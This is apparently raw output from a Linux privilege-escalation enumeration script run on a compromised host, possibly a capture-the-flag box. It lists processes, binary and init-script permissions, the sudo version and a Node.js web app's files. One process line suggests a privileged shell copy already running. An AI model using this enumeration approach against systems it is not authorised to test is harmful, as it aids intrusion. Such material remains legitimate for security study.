root         5  0.0  0.0      0     0 ?        S<   03:27   0:00 [kworker/0:0H]
root         7  0.0  0.0      0     0 ?        S    03:27   0:05 [rcu_sched]
root         8  0.0  0.0      0     0 ?        S    03:27   0:00 [rcu_bh]
root         9  0.0  0.0      0     0 ?        S    03:27   0:00 [migration/0]
root        10  0.0  0.0      0     0 ?        S    03:27   0:00 [watchdog/0]
root        11  0.0  0.0      0     0 ?        S    03:27   0:00 [kdevtmpfs]
root        12  0.0  0.0      0     0 ?        S<   03:27   0:00 [netns]
root        13  0.0  0.0      0     0 ?        S<   03:27   0:00 [perf]
root        14  0.0  0.0      0     0 ?        S    03:27   0:00 [khungtaskd]
root        15  0.0  0.0      0     0 ?        S<   03:27   0:00 [writeback]
root        16  0.0  0.0      0     0 ?        SN   03:27   0:00 [ksmd]
root        17  0.0  0.0      0     0 ?        SN   03:27   0:00 [khugepaged]
root        18  0.0  0.0      0     0 ?        S<   03:27   0:00 [crypto]
root        19  0.0  0.0      0     0 ?        S<   03:27   0:00 [kintegrityd]
root        20  0.0  0.0      0     0 ?        S<   03:27   0:00 [bioset]
root        21  0.0  0.0      0     0 ?        S<   03:27   0:00 [kblockd]
root        22  0.0  0.0      0     0 ?        S<   03:27   0:00 [ata_sff]
root        23  0.0  0.0      0     0 ?        S<   03:27   0:00 [md]
root        24  0.0  0.0      0     0 ?        S<   03:27   0:00 [devfreq_wq]
root        28  0.0  0.0      0     0 ?        S    03:27   0:00 [kswapd0]
root        29  0.0  0.0      0     0 ?        S<   03:27   0:00 [vmstat]
root        30  0.0  0.0      0     0 ?        S    03:27   0:00 [fsnotify_mark]
root        31  0.0  0.0      0     0 ?        S    03:27   0:00 [ecryptfs-kthrea]
root        47  0.0  0.0      0     0 ?        S<   03:27   0:00 [kthrotld]
root        48  0.0  0.0      0     0 ?        S<   03:27   0:00 [acpi_thermal_pm]
root        49  0.0  0.0      0     0 ?        S<   03:27   0:00 [bioset]
root        50  0.0  0.0      0     0 ?        S<   03:27   0:00 [bioset]
root        51  0.0  0.0      0     0 ?        S<   03:27   0:00 [bioset]
root        52  0.0  0.0      0     0 ?        S<   03:27   0:00 [bioset]
root        53  0.0  0.0      0     0 ?        S<   03:27   0:00 [bioset]
root        54  0.0  0.0      0     0 ?        S<   03:27   0:00 [bioset]
root        55  0.0  0.0      0     0 ?        S<   03:27   0:00 [bioset]
root        56  0.0  0.0      0     0 ?        S<   03:27   0:00 [bioset]
root        57  0.0  0.0      0     0 ?        S    03:27   0:00 [scsi_eh_0]
root        58  0.0  0.0      0     0 ?        S<   03:27   0:00 [scsi_tmf_0]
root        59  0.0  0.0      0     0 ?        S    03:27   0:00 [scsi_eh_1]
root        60  0.0  0.0      0     0 ?        S<   03:27   0:00 [scsi_tmf_1]
root        66  0.0  0.0      0     0 ?        S<   03:27   0:00 [ipv6_addrconf]
root        79  0.0  0.0      0     0 ?        S<   03:27   0:00 [deferwq]
root        80  0.0  0.0      0     0 ?        S<   03:27   0:00 [charger_manager]
root        82  0.0  0.0      0     0 ?        S<   03:27   0:00 [bioset]
root       131  0.0  0.0      0     0 ?        S<   03:27   0:00 [kpsmoused]
root       132  0.0  0.0      0     0 ?        S<   03:27   0:00 [ttm_swap]
root       161  0.0  0.0      0     0 ?        S    03:27   0:00 [scsi_eh_2]
root       162  0.0  0.0      0     0 ?        S<   03:27   0:00 [scsi_tmf_2]
root       163  0.0  0.0      0     0 ?        S    03:27   0:00 [scsi_eh_3]
root       164  0.0  0.0      0     0 ?        S<   03:27   0:00 [scsi_tmf_3]
root       165  0.0  0.0      0     0 ?        S    03:27   0:00 [scsi_eh_4]
root       166  0.0  0.0      0     0 ?        S<   03:27   0:00 [scsi_tmf_4]
root       167  0.0  0.0      0     0 ?        S    03:27   0:00 [scsi_eh_5]
root       168  0.0  0.0      0     0 ?        S<   03:27   0:00 [scsi_tmf_5]
root       169  0.0  0.0      0     0 ?        S    03:27   0:00 [scsi_eh_6]
root       170  0.0  0.0      0     0 ?        S<   03:27   0:00 [scsi_tmf_6]
root       171  0.0  0.0      0     0 ?        S    03:27   0:00 [scsi_eh_7]
root       172  0.0  0.0      0     0 ?        S<   03:27   0:00 [scsi_tmf_7]
root       173  0.0  0.0      0     0 ?        S    03:27   0:00 [scsi_eh_8]
root       174  0.0  0.0      0     0 ?        S<   03:27   0:00 [scsi_tmf_8]
root       175  0.0  0.0      0     0 ?        S    03:27   0:00 [scsi_eh_9]
root       176  0.0  0.0      0     0 ?        S<   03:27   0:00 [scsi_tmf_9]
root       177  0.0  0.0      0     0 ?        S    03:27   0:00 [scsi_eh_10]
root       178  0.0  0.0      0     0 ?        S<   03:27   0:00 [scsi_tmf_10]
root       179  0.0  0.0      0     0 ?        S    03:27   0:00 [scsi_eh_11]
root       180  0.0  0.0      0     0 ?        S<   03:27   0:00 [scsi_tmf_11]
root       181  0.0  0.0      0     0 ?        S    03:27   0:00 [scsi_eh_12]
root       182  0.0  0.0      0     0 ?        S<   03:27   0:00 [scsi_tmf_12]
root       183  0.0  0.0      0     0 ?        S    03:27   0:00 [scsi_eh_13]
root       184  0.0  0.0      0     0 ?        S<   03:27   0:00 [scsi_tmf_13]
root       185  0.0  0.0      0     0 ?        S    03:27   0:00 [scsi_eh_14]
root       186  0.0  0.0      0     0 ?        S<   03:27   0:00 [scsi_tmf_14]
root       187  0.0  0.0      0     0 ?        S    03:27   0:00 [scsi_eh_15]
root       188  0.0  0.0      0     0 ?        S<   03:27   0:00 [scsi_tmf_15]
root       189  0.0  0.0      0     0 ?        S    03:27   0:00 [scsi_eh_16]
root       190  0.0  0.0      0     0 ?        S<   03:27   0:00 [scsi_tmf_16]
root       191  0.0  0.0      0     0 ?        S    03:27   0:00 [scsi_eh_17]
root       192  0.0  0.0      0     0 ?        S<   03:27   0:00 [scsi_tmf_17]
root       193  0.0  0.0      0     0 ?        S    03:27   0:00 [scsi_eh_18]
root       194  0.0  0.0      0     0 ?        S<   03:27   0:00 [scsi_tmf_18]
root       195  0.0  0.0      0     0 ?        S    03:27   0:00 [scsi_eh_19]
root       196  0.0  0.0      0     0 ?        S<   03:27   0:00 [scsi_tmf_19]
root       197  0.0  0.0      0     0 ?        S    03:27   0:00 [scsi_eh_20]
root       198  0.0  0.0      0     0 ?        S<   03:27   0:00 [scsi_tmf_20]
root       199  0.0  0.0      0     0 ?        S    03:27   0:00 [scsi_eh_21]
root       200  0.0  0.0      0     0 ?        S<   03:27   0:00 [scsi_tmf_21]
root       201  0.0  0.0      0     0 ?        S    03:27   0:00 [scsi_eh_22]
root       202  0.0  0.0      0     0 ?        S<   03:27   0:00 [scsi_tmf_22]
root       203  0.0  0.0      0     0 ?        S    03:27   0:00 [scsi_eh_23]
root       204  0.0  0.0      0     0 ?        S<   03:27   0:00 [scsi_tmf_23]
root       205  0.0  0.0      0     0 ?        S    03:27   0:00 [scsi_eh_24]
root       206  0.0  0.0      0     0 ?        S<   03:27   0:00 [scsi_tmf_24]
root       207  0.0  0.0      0     0 ?        S    03:27   0:00 [scsi_eh_25]
root       208  0.0  0.0      0     0 ?        S<   03:27   0:00 [scsi_tmf_25]
root       209  0.0  0.0      0     0 ?        S    03:27   0:00 [scsi_eh_26]
root       210  0.0  0.0      0     0 ?        S<   03:27   0:00 [scsi_tmf_26]
root       211  0.0  0.0      0     0 ?        S    03:27   0:00 [scsi_eh_27]
root       212  0.0  0.0      0     0 ?        S<   03:27   0:00 [scsi_tmf_27]
root       213  0.0  0.0      0     0 ?        S    03:27   0:00 [scsi_eh_28]
root       214  0.0  0.0      0     0 ?        S<   03:27   0:00 [scsi_tmf_28]
root       215  0.0  0.0      0     0 ?        S    03:27   0:00 [scsi_eh_29]
root       216  0.0  0.0      0     0 ?        S<   03:27   0:00 [scsi_tmf_29]
root       217  0.0  0.0      0     0 ?        S    03:27   0:00 [scsi_eh_30]
root       218  0.0  0.0      0     0 ?        S<   03:27   0:00 [scsi_tmf_30]
root       219  0.0  0.0      0     0 ?        S    03:27   0:00 [scsi_eh_31]
root       220  0.0  0.0      0     0 ?        S<   03:27   0:00 [scsi_tmf_31]
root       246  0.0  0.0      0     0 ?        S    03:27   0:01 [kworker/u2:29]
root       249  0.0  0.0      0     0 ?        S    03:27   0:01 [kworker/u2:32]
root       250  0.0  0.0      0     0 ?        S<   03:27   0:00 [bioset]
root       315  0.0  0.0      0     0 ?        S<   03:27   0:00 [kworker/0:1H]
root       322  0.0  0.0      0     0 ?        S<   03:27   0:00 [raid5wq]
root       347  0.0  0.0      0     0 ?        S<   03:27   0:00 [kdmflush]
root       348  0.0  0.0      0     0 ?        S<   03:27   0:00 [bioset]
root       358  0.0  0.0      0     0 ?        S<   03:27   0:00 [kdmflush]
root       359  0.0  0.0      0     0 ?        S<   03:27   0:00 [bioset]
root       376  0.0  0.0      0     0 ?        S<   03:27   0:00 [bioset]
root       401  0.0  0.0      0     0 ?        S    03:27   0:01 [jbd2/dm-0-8]
root       402  0.0  0.0      0     0 ?        S<   03:27   0:00 [ext4-rsv-conver]
root       448  0.0  0.0      0     0 ?        S    03:27   0:21 [kworker/0:3]
root       468  0.0  0.3  28032  2740 ?        Ss   03:27   0:00 /lib/systemd/systemd-journald
root       475  0.0  0.0      0     0 ?        S<   03:27   0:00 [iscsi_eh]
root       478  0.0  0.0      0     0 ?        S    03:27   0:00 [kauditd]
root       495  0.0  0.0      0     0 ?        S<   03:27   0:00 [ib_addr]
root       496  0.0  0.2 102968  1660 ?        Ss   03:27   0:00 /sbin/lvmetad -f
root       507  0.0  0.0      0     0 ?        S<   03:27   0:00 [ib_mcast]
root       510  0.0  0.0      0     0 ?        S<   03:27   0:00 [ib_nl_sa_wq]
root       511  0.0  0.4  44360  3784 ?        Ss   03:27   0:00 /lib/systemd/systemd-udevd
root       516  0.0  0.0      0     0 ?        S<   03:27   0:00 [ib_cm]
root       519  0.0  0.0      0     0 ?        S<   03:27   0:00 [iw_cm_wq]
root       522  0.0  0.0      0     0 ?        S<   03:27   0:00 [rdma_cm]
root       875  0.0  0.0      0     0 ?        S<   03:27   0:00 [ext4-rsv-conver]
systemd+   906  0.0  0.3 100324  2392 ?        Ssl  03:27   0:03 /lib/systemd/systemd-timesyncd
message+  1025  0.0  0.4  42904  3608 ?        Ss   03:27   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation
root      1039  0.0  0.4  28548  3104 ?        Ss   03:27   0:00 /lib/systemd/systemd-logind
root      1040  0.0  0.7 275892  5740 ?        Ssl  03:27   0:00 /usr/lib/accountsservice/accounts-daemon
root      1042  0.0  0.4 637208  3312 ?        Ssl  03:27   0:03 /usr/bin/lxcfs /var/lib/lxcfs/
syslog    1043  0.0  0.3 256400  2884 ?        Ssl  03:27   0:00 /usr/sbin/rsyslogd -n
root      1045  0.0  0.3  29008  2384 ?        Ss   03:27   0:00 /usr/sbin/cron -f
root      1049  0.0  1.2 185888  9776 ?        Ssl  03:27   0:33 /usr/bin/vmtoolsd
root      1063  0.0  0.1   4400  1268 ?        Ss   03:27   0:00 /usr/sbin/acpid
daemon    1097  0.0  0.2  26044  2076 ?        Ss   03:27   0:00 /usr/sbin/atd -f
root      1104  0.0  2.9 343176 22468 ?        S<sl 03:27   0:00 /usr/lib/snapd/snapd
root      1126  0.0  0.9 277180  7516 ?        Ssl  03:27   0:00 /usr/lib/policykit-1/polkitd --no-debug
root      1147  0.0  0.0  13376   164 ?        Ss   03:27   0:00 /sbin/mdadm --monitor --pid-file /run/mdadm/monitor.pid --daemonise --scan --syslog
mongodb   1201  0.4 10.2 288424 77348 ?        Ssl  03:27   4:27 /usr/bin/mongod --auth --quiet --config /etc/mongod.conf
tom       1203  0.0  5.5 1009080 42280 ?       Ssl  03:27   0:09 /usr/bin/node /var/scheduler/app.js
tom       1215  0.0  9.1 1058776 69680 ?       Ssl  03:27   0:40 /usr/bin/node /var/www/myplace/app.js
root      1219  0.0  0.8  65520  6104 ?        Ss   03:27   0:00 /usr/sbin/sshd -D
root      1229  0.0  0.0   5224   124 ?        Ss   03:27   0:01 /sbin/iscsid
root      1230  0.0  0.4   5724  3536 ?        S<Ls 03:27   0:06 /sbin/iscsid
root      1283  0.0  0.2  15940  1568 tty1     Ss+  03:27   0:00 /sbin/agetty --noclear tty1 linux
root     16170  0.0  0.9  95404  6848 ?        Ss   18:28   0:00 sshd: mark [priv]
mark     16172  0.0  0.5  45248  4424 ?        Ss   18:28   0:00 /lib/systemd/systemd --user
root     16174  0.0  0.0      0     0 ?        S    18:28   0:01 [kworker/0:1]
mark     16175  0.0  0.2  61536  1944 ?        S    18:28   0:00 (sd-pam)
mark     16183  0.0  0.5  95404  4260 ?        S    18:28   0:00 sshd: mark@pts/0
mark     16184  0.0  0.7  22596  5348 pts/0    Ss   18:28   0:00 -bash
tom      16593  0.0  0.5  21320  3808 pts/0    S    19:22   0:00 ./tom -p
mark     16601  0.1  0.5  13500  4036 pts/0    S+   19:29   0:00 bash
mark     16602  0.1  0.5  13968  3928 pts/0    S+   19:29   0:00 bash
mark     16603  0.0  0.0   7316   692 pts/0    S+   19:29   0:00 tee -a
mark     17645  0.0  0.4  13968  3364 pts/0    S+   19:30   0:00 bash
mark     17646  0.0  0.4  37372  3368 pts/0    R+   19:30   0:00 ps aux


[-] Process binaries and associated permissions (from above list):
1.6M -rwxr-xr-x 1 root root 1.6M Jul 19  2017 /lib/systemd/systemd
320K -rwxr-xr-x 1 root root 319K Jul 19  2017 /lib/systemd/systemd-journald
608K -rwxr-xr-x 1 root root 605K Jul 19  2017 /lib/systemd/systemd-logind
140K -rwxr-xr-x 1 root root 139K Jul 19  2017 /lib/systemd/systemd-timesyncd
444K -rwxr-xr-x 1 root root 443K Jul 19  2017 /lib/systemd/systemd-udevd
 44K -rwxr-xr-x 1 root root  44K Jun 14  2017 /sbin/agetty
   0 lrwxrwxrwx 1 root root   20 Aug 29  2017 /sbin/init -> /lib/systemd/systemd
768K -rwxr-xr-x 1 root root 766K Jul 26  2017 /sbin/iscsid
 52K -rwxr-xr-x 1 root root  51K Apr 16  2016 /sbin/lvmetad
504K -rwxr-xr-x 1 root root 502K Feb 20  2017 /sbin/mdadm
220K -rwxr-xr-x 1 root root 219K Jan 12  2017 /usr/bin/dbus-daemon
 20K -rwxr-xr-x 1 root root  19K Jul  5  2017 /usr/bin/lxcfs
 37M -rwxr-xr-x 1 root root  37M Jul 27  2017 /usr/bin/mongod
   0 lrwxrwxrwx 1 root root   22 Aug 30  2017 /usr/bin/node -> /etc/alternatives/node
 44K -rwxr-xr-x 1 root root  44K Feb  9  2017 /usr/bin/vmtoolsd
164K -rwxr-xr-x 1 root root 162K Nov  3  2016 /usr/lib/accountsservice/accounts-daemon
 16K -rwxr-xr-x 1 root root  15K Jan 17  2016 /usr/lib/policykit-1/polkitd
 19M -rwxr-xr-x 1 root root  19M Jul 17  2017 /usr/lib/snapd/snapd
 48K -rwxr-xr-x 1 root root  47K Apr  8  2016 /usr/sbin/acpid
 28K -rwxr-xr-x 1 root root  27K Jan 14  2016 /usr/sbin/atd
 44K -rwxr-xr-x 1 root root  44K Apr  5  2016 /usr/sbin/cron
588K -rwxr-xr-x 1 root root 586K Apr  5  2016 /usr/sbin/rsyslogd
784K -rwxr-xr-x 1 root root 781K Mar 16  2017 /usr/sbin/sshd


[-] /etc/init.d/ binary permissions:
total 304
drwxr-xr-x  2 root root 4096 Aug 30  2017 .
drwxr-xr-x 92 root root 4096 Jan 18 14:40 ..
-rwxr-xr-x  1 root root 2243 Feb  9  2016 acpid
-rwxr-xr-x  1 root root 6223 Mar  3  2017 apparmor
-rwxr-xr-x  1 root root 2799 Mar 31  2016 apport
-rwxr-xr-x  1 root root 1071 Dec  6  2015 atd
-rwxr-xr-x  1 root root 1275 Jan 19  2016 bootmisc.sh
-rwxr-xr-x  1 root root 3807 Jan 19  2016 checkfs.sh
-rwxr-xr-x  1 root root 1098 Jan 19  2016 checkroot-bootclean.sh
-rwxr-xr-x  1 root root 9353 Jan 19  2016 checkroot.sh
-rwxr-xr-x  1 root root 1343 Apr  4  2016 console-setup
-rwxr-xr-x  1 root root 3049 Apr  5  2016 cron
-rwxr-xr-x  1 root root  937 Mar 28  2015 cryptdisks
-rwxr-xr-x  1 root root  896 Mar 28  2015 cryptdisks-early
-rwxr-xr-x  1 root root 2813 Dec  2  2015 dbus
-rw-r--r--  1 root root 1264 Aug 30  2017 .depend.boot
-rw-r--r--  1 root root  955 Aug 30  2017 .depend.start
-rw-r--r--  1 root root 1019 Aug 30  2017 .depend.stop
-rwxr-xr-x  1 root root 1105 Mar 15  2016 grub-common
-rwxr-xr-x  1 root root 1336 Jan 19  2016 halt
-rwxr-xr-x  1 root root 1423 Jan 19  2016 hostname.sh
-rwxr-xr-x  1 root root 3809 Mar 12  2016 hwclock.sh
-rwxr-xr-x  1 root root 2372 Apr 11  2016 irqbalance
-rwxr-xr-x  1 root root 1503 Mar 29  2016 iscsid
-rwxr-xr-x  1 root root 1804 Apr  4  2016 keyboard-setup
-rwxr-xr-x  1 root root 1300 Jan 19  2016 killprocs
-rwxr-xr-x  1 root root 2087 Dec 20  2015 kmod
-rwxr-xr-x  1 root root  695 Oct 30  2015 lvm2
-rwxr-xr-x  1 root root  571 Oct 30  2015 lvm2-lvmetad
-rwxr-xr-x  1 root root  586 Oct 30  2015 lvm2-lvmpolld
-rwxr-xr-x  1 root root 2300 Jul  5  2017 lxcfs
-rwxr-xr-x  1 root root 2541 Jun  8  2017 lxd
-rwxr-xr-x  1 root root 2611 Apr 11  2016 mdadm
-rwxr-xr-x  1 root root 1199 Jul 16  2014 mdadm-waitidle
-rwxr-xr-x  1 root root  703 Jan 19  2016 mountall-bootclean.sh
-rwxr-xr-x  1 root root 2301 Jan 19  2016 mountall.sh
-rwxr-xr-x  1 root root 1461 Jan 19  2016 mountdevsubfs.sh
-rwxr-xr-x  1 root root 1564 Jan 19  2016 mountkernfs.sh
-rwxr-xr-x  1 root root  711 Jan 19  2016 mountnfs-bootclean.sh
-rwxr-xr-x  1 root root 2456 Jan 19  2016 mountnfs.sh
-rwxr-xr-x  1 root root 4771 Jul 19  2015 networking
-rwxr-xr-x  1 root root 1581 Oct 16  2015 ondemand
-rwxr-xr-x  1 root root 2503 Mar 29  2016 open-iscsi
-rwxr-xr-x  1 root root 1578 Sep 18  2016 open-vm-tools
-rwxr-xr-x  1 root root 1366 Nov 15  2015 plymouth
-rwxr-xr-x  1 root root  752 Nov 15  2015 plymouth-log
-rwxr-xr-x  1 root root 1192 Sep  6  2015 procps
-rwxr-xr-x  1 root root 6366 Jan 19  2016 rc
-rwxr-xr-x  1 root root  820 Jan 19  2016 rc.local
-rwxr-xr-x  1 root root  117 Jan 19  2016 rcS
-rw-r--r--  1 root root 2427 Jan 19  2016 README
-rwxr-xr-x  1 root root  661 Jan 19  2016 reboot
-rwxr-xr-x  1 root root 4149 Nov 23  2015 resolvconf
-rwxr-xr-x  1 root root 4355 Jul 10  2014 rsync
-rwxr-xr-x  1 root root 2796 Feb  3  2016 rsyslog
-rwxr-xr-x  1 root root 1226 Jun  9  2015 screen-cleanup
-rwxr-xr-x  1 root root 3927 Jan 19  2016 sendsigs
-rwxr-xr-x  1 root root  597 Jan 19  2016 single
-rw-r--r--  1 root root 1087 Jan 19  2016 skeleton
-rwxr-xr-x  1 root root 4077 Mar 16  2017 ssh
-rwxr-xr-x  1 root root 6087 Apr 12  2016 udev
-rwxr-xr-x  1 root root 2049 Aug  7  2014 ufw
-rwxr-xr-x  1 root root 2737 Jan 19  2016 umountfs
-rwxr-xr-x  1 root root 2202 Jan 19  2016 umountnfs.sh
-rwxr-xr-x  1 root root 1879 Jan 19  2016 umountroot
-rwxr-xr-x  1 root root 1391 Apr 20  2017 unattended-upgrades
-rwxr-xr-x  1 root root 3111 Jan 19  2016 urandom
-rwxr-xr-x  1 root root 1306 Jun 14  2017 uuidd


### SOFTWARE #############################################
[-] Sudo version:
Sudo version 1.8.16


[-] www home dir contents:
/var/www/:
total 12K
drwxr-xr-x  3 root root 4.0K Sep  3  2017 .
drwxr-xr-x 15 root root 4.0K Sep  3  2017 ..
drwxr-xr-x  4 root root 4.0K Sep  3  2017 myplace

/var/www/myplace:
total 56K
drwxr-xr-x  4 root root 4.0K Sep  3  2017 .
drwxr-xr-x  3 root root 4.0K Sep  3  2017 ..
-rw-rw-r--  1 root root 3.8K Sep  2  2017 app.html
-rw-rw-r--  1 root root 7.9K Sep  3  2017 app.js
drwxr-xr-x 69 root root 4.0K Sep  2  2017 node_modules
-rw-rw-r--  1 root root  283 Sep  2  2017 package.json
-rw-r--r--  1 root root  21K Sep  2  2017 package-lock.json
drwxrwxr-x  6 root root 4.0K Sep  2  2017 static

/var/www/myplace/node_modules:
total 276K
drwxr-xr-x 69 root root 4.0K Sep  2  2017 .
drwxr-xr-x  4 root root 4.0K Sep  3  2017 ..
drwxr-xr-x  2 root root 4.0K Sep  2  2017 accepts
drwxr-xr-x  2 root root 4.0K Sep  2  2017 array-flatten
drwxr-xr-x  2 root root 4.0K Sep  2  2017 .bin
drwxr-xr-x  3 root root 4.0K Sep  2  2017 body-parser
drwxr-xr-x  4 root root 4.0K Sep  2  2017 bson
drwxr-xr-x  2 root root 4.0K Sep  2  2017 buffer-shims
drwxr-xr-x  2 root root 4.0K Sep  2  2017 bytes
drwxr-xr-x  2 root root 4.0K Sep  2  2017 content-disposition
drwxr-xr-x  2 root root 4.0K Sep  2  2017 content-type
drwxr-xr-x  2 root root 4.0K Sep  2  2017 cookie
drwxr-xr-x  2 root root 4.0K Sep  2  2017 cookie-signature
drwxr-xr-x  3 root root 4.0K Sep  2  2017 core-util-is
drwxr-xr-x  3 root root 4.0K Sep  2  2017 crc
drwxr-xr-x  3 root root 4.0K Sep  2  2017 debug
drwxr-xr-x  3 root root 4.0K Sep  2  2017 depd
drwxr-xr-x  2 root root 4.0K Sep  2  2017 destroy
drwxr-xr-x  2 root root 4.0K Sep  2  2017 ee-first
drwxr-xr-x  2 root root 4.0K Sep  2  2017 encodeurl
drwxr-xr-x  4 root root 4.0K Sep  2  2017 es6-promise
drwxr-xr-x  2 root root 4.0K Sep  2  2017 escape-html
drwxr-xr-x  2 root root 4.0K Sep  2  2017 etag
drwxr-xr-x  4 root root 4.0K Sep  2  2017 express
drwxr-xr-x  4 root root 4.0K Sep  2  2017 express-session
drwxr-xr-x  3 root root 4.0K Sep  2  2017 finalhandler
drwxr-xr-x  2 root root 4.0K Sep  2  2017 forwarded
drwxr-xr-x  2 root root 4.0K Sep  2  2017 fresh
drwxr-xr-x  2 root root 4.0K Sep  2  2017 http-errors
drwxr-xr-x  4 root root 4.0K Sep  2  2017 iconv-lite
drwxr-xr-x  2 root root 4.0K Sep  2  2017 inherits
drwxr-xr-x  5 root root 4.0K Sep  2  2017 ipaddr.js
drwxr-xr-x  2 root root 4.0K Sep  2  2017 isarray
drwxr-xr-x  2 root root 4.0K Sep  2  2017 media-typer
drwxr-xr-x  2 root root 4.0K Sep  2  2017 merge-descriptors
drwxr-xr-x  2 root root 4.0K Sep  2  2017 methods
drwxr-xr-x  3 root root 4.0K Sep  2  2017 mime
drwxr-xr-x  2 root root 4.0K Sep  2  2017 mime-db
drwxr-xr-x  2 root root 4.0K Sep  2  2017 mime-types
drwxr-xr-x  3 root root 4.0K Sep  2  2017 mongodb
drwxr-xr-x  3 root root 4.0K Sep  2  2017 mongodb-core
drwxr-xr-x  2 root root 4.0K Sep  2  2017 ms
drwxr-xr-x  3 root root 4.0K Sep  2  2017 negotiator
drwxr-xr-x  2 root root 4.0K Sep  2  2017 on-finished
drwxr-xr-x  2 root root 4.0K Sep  2  2017 on-headers
drwxr-xr-x  2 root root 4.0K Sep  2  2017 parseurl
drwxr-xr-x  2 root root 4.0K Sep  2  2017 path-to-regexp
drwxr-xr-x  2 root root 4.0K Sep  2  2017 process-nextick-args
drwxr-xr-x  2 root root 4.0K Sep  2  2017 proxy-addr
drwxr-xr-x  5 root root 4.0K Sep  2  2017 qs
drwxr-xr-x  2 root root 4.0K Sep  2  2017 random-bytes
drwxr-xr-x  2 root root 4.0K Sep  2  2017 range-parser
drwxr-xr-x  2 root root 4.0K Sep  2  2017 raw-body
drwxr-xr-x  4 root root 4.0K Sep  2  2017 readable-stream
drwxr-xr-x  3 root root 4.0K Sep  2  2017 require_optional
drwxr-xr-x  2 root root 4.0K Sep  2  2017 resolve-from
drwxr-xr-x  2 root root 4.0K Sep  2  2017 safe-buffer
drwxr-xr-x  3 root root 4.0K Sep  2  2017 semver
drwxr-xr-x  3 root root 4.0K Sep  2  2017 send
drwxr-xr-x  2 root root 4.0K Sep  2  2017 serve-static
drwxr-xr-x  2 root root 4.0K Sep  2  2017 setprototypeof
drwxr-xr-x  2 root root 4.0K Sep  2  2017 statuses
drwxr-xr-x  3 root root 4.0K Sep  2  2017 string_decoder
drwxr-xr-x  2 root root 4.0K Sep  2  2017 type-is
drwxr-xr-x  2 root root 4.0K Sep  2  2017 uid-safe
drwxr-xr-x  2 root root 4.0K Sep  2  2017 unpipe
drwxr-xr-x  2 root root 4.0K Sep  2  2017 util-deprecate
drwxr-xr-x  2 root root 4.0K Sep  2  2017 utils-merge
drwxr-xr-x  2 root root 4.0K Sep  2  2017 vary

/var/www/myplace/node_modules/accepts:
total 40K
drwxr-xr-x  2 root root 4.0K Sep  2  2017 .
drwxr-xr-x 69 root root 4.0K Sep  2  2017 ..
-rw-r--r--  1 root root 4.6K Aug 23  2017 HISTORY.md
-rw-r--r--  1 root root 5.2K Apr  1  2017 index.js
-rw-r--r--  1 root root 1.2K Apr  1  2017 LICENSE
-rw-r--r--  1 root root 2.3K Sep  2  2017 package.json
-rw-r--r--  1 root root 4.1K Apr  1  2017 README.md

/var/www/myplace/node_modules/array-flatten:
total 24K
drwxr-xr-x  2 root root 4.0K Sep  2  2017 .
drwxr-xr-x 69 root root 4.0K Sep  2  2017 ..
-rw-r--r--  1 root root 1.2K Jul  9  2015 array-flatten.js
-rw-r--r--  1 root root 1.1K Mar 15  2014 LICENSE
-rw-r--r--  1 root root 1.7K Sep  2  2017 package.json
-rw-r--r--  1 root root 1.3K May  9  2015 README.md

/var/www/myplace/node_modules/.bin:
total 8.0K
drwxr-xr-x  2 root root 4.0K Sep  2  2017 .
drwxr-xr-x 69 root root 4.0K Sep  2  2017 ..
lrwxrwxrwx  1 root root   14 Sep  2  2017 mime -> ../mime/cli.js
lrwxrwxrwx  1 root root   20 Sep  2  2017 semver -> ../semver/bin/semver

/var/www/myplace/node_modules/body-parser:
total 56K
drwxr-xr-x  3 root root 4.0K Sep  2  2017 .
drwxr-xr-x 69 root root 4.0K Sep  2  2017 ..
-rw-r--r--  1 root root  13K May 18  2017 HISTORY.md
-rw-r--r--  1 root root 2.6K Jan 16  2017 index.js
drwxr-xr-x  3 root root 4.0K Sep  2  2017 lib
-rw-r--r--  1 root root 1.2K Jan 16  2017 LICENSE
-rw-r--r--  1 root root 2.6K Sep  2  2017 package.json
-rw-r--r--  1 root root  16K May 18  2017 README.md

/var/www/myplace/node_modules/body-parser/lib:
total 16K
drwxr-xr-x 3 root root 4.0K Sep  2  2017 .
drwxr-xr-x 3 root root 4.0K Sep  2  2017 ..
-rw-r--r-- 1 root root 3.8K Mar  7  2017 read.js
drwxr-xr-x 2 root root 4.0K Sep  2  2017 types

/var/www/myplace/node_modules/body-parser/lib/types:
total 28K
drwxr-xr-x 2 root root 4.0K Sep  2  2017 .
drwxr-xr-x 3 root root 4.0K Sep  2  2017 ..
-rw-r--r-- 1 root root 3.6K Mar  6  2017 json.js
-rw-r--r-- 1 root root 1.9K Jan 16  2017 raw.js
-rw-r--r-- 1 root root 2.3K Jan 16  2017 text.js
-rw-r--r-- 1 root root 5.6K Jan 16  2017 urlencoded.js

/var/www/myplace/node_modules/bson:
total 56K
drwxr-xr-x  4 root root 4.0K Sep  2  2017 .
drwxr-xr-x 69 root root 4.0K Sep  2  2017 ..
-rw-r--r--  1 root root  460 Dec  2  2015 bower.json
drwxr-xr-x  2 root root 4.0K Sep  2  2017 browser_build
-rw-r--r--  1 root root 5.6K Jan 11  2017 HISTORY.md
-rw-r--r--  1 root root 1.5K Dec  5  2016 index.js
drwxr-xr-x  3 root root 4.0K Sep  2  2017 lib
-rw-r--r--  1 root root  12K May 17  2016 LICENSE.md
-rw-r--r--  1 root root 2.0K Sep  2  2017 package.json
-rw-r--r--  1 root root 6.5K Jan  2  2017 README.md

/var/www/myplace/node_modules/bson/browser_build:
total 520K
drwxr-xr-x 2 root root 4.0K Sep  2  2017 .
drwxr-xr-x 4 root root 4.0K Sep  2  2017 ..
-rw-r--r-- 1 root root 508K Dec  5  2016 bson.js
-rw-r--r-- 1 root root  357 Dec  5  2016 package.json

/var/www/myplace/node_modules/bson/lib:
total 12K
drwxr-xr-x 3 root root 4.0K Sep  2  2017 .
drwxr-xr-x 4 root root 4.0K Sep  2  2017 ..
drwxr-xr-x 3 root root 4.0K Sep  2  2017 bson

/var/www/myplace/node_modules/bson/lib/bson:
total 160K
drwxr-xr-x 3 root root 4.0K Sep  2  2017 .
drwxr-xr-x 3 root root 4.0K Sep  2  2017 ..
-rw-r--r-- 1 root root  11K Mar  4  2016 binary.js
-rw-r--r-- 1 root root  12K Dec  7  2016 bson.js
-rw-r--r-- 1 root root  536 Dec  5  2016 code.js
-rw-r--r-- 1 root root  722 Aug  6  2015 db_ref.js
-rw-r--r-- 1 root root  21K Dec  5  2016 decimal128.js
-rw-r--r-- 1 root root  609 Dec  5  2016 double.js
-rw-r--r-- 1 root root 3.9K Aug  6  2015 float_parser.js
-rw-r--r-- 1 root root  443 Dec  5  2016 int_32.js
